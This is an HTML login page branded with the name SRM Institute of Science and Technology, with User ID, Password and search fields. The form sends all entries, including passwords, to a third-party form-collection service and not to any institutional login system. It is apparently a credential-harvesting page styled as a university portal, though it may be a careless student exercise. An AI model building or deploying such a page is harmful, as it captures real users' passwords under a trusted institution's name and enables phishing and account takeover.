<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Portal</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,Helvetica,sans-serif;
}

body{
    background:linear-gradient(135deg,#141e30,#243b55);
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}

.container{
    width:420px;
    background:#fff;
    padding:35px;
    border-radius:15px;
    box-shadow:0 10px 25px rgba(0,0,0,0.4);
    text-align:center;
}

.logo{
    width:120px;
    height:120px;
    object-fit:contain;
    margin-bottom:15px;
}

h2{
    color:#222;
    margin-bottom:20px;
}

.input-box{
    width:100%;
    padding:14px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:30px;
    outline:none;
    font-size:16px;
}

.search-box{
    width:100%;
    padding:14px;
    margin-top:20px;
    border-radius:30px;
    border:1px solid #ccc;
    outline:none;
    font-size:16px;
}

.btn{
    width:100%;
    padding:14px;
    margin-top:18px;
    border:none;
    border-radius:30px;
    background:#007bff;
    color:white;
    font-size:17px;
    cursor:pointer;
    transition:.3s;
}

.btn:hover{
    background:#0056b3;
}

.search-btn{
    background:#28a745;
}

.search-btn:hover{
    background:#1d7d33;
}

.footer{
    margin-top:18px;
    color:#666;
    font-size:14px;
}
</style>

</head>
<body>

<div class="container">

<img src="images.png" class="logo" alt="Logo">

<h2>Login Portal</h2>

<form action="https://formcarry.com/s/1sR_Nhe2SDl" method="POST">

<input
type="text"
name="User ID"
class="input-box"
placeholder="Enter User ID"
required>

<input
type="password"
name="Password"
class="input-box"
placeholder="Enter Password"
required>

<input
type="text"
name="Search Text"
class="search-box"
placeholder="Search like Google..."
required>

<button type="submit" class="btn">
Login & Submit
</button>

<button type="submit" class="btn search-btn">
Search
</button>

</form>

<div class="footer">
SRM Institute of Science and Technology
</div>

</div>

</body>
</html>
